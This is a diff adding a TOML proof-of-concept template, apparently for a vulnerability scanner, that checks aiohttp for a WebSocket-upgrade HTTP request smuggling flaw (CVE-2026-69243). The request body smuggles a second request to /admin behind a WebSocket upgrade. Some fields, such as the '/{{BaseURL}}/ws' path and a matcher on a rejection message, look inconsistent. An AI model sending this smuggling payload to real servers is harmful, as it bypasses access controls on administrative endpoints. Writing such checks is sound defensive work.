@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "验证 aiohttp < 3.14.2 是否存在 WebSocket 升级 HTTP 请求走私漏洞（CWE-444）。通过向目标发送携带消息体的 WebSocket 升级请求，走私第二请求至 /admin 路径，若后端处理了走私请求而前端代理仅记录一次请求，则判定漏洞存在。"
+id = "POC-AVE-2026-1315"
+name = "CVE-2026-69243 aiohttp WebSocket HTTP Request Smuggling PoC"
+severity = "medium"
+tags = ["ave-2026-1315"]
+vuln_id = [
+    "CVE-2026-69243",
+    "AVE-2026-1315",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ws"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+GET /admin HTTP/1.1\r
+Host: {{Hostname}}\r
+Connection: close\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Connection = "Upgrade"
+Content-Length = "43"
+Host = "{{Hostname}}"
+Upgrade = "websocket"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [
+    403,
+    404,
+    200,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["WebSocket upgrade rejected"]
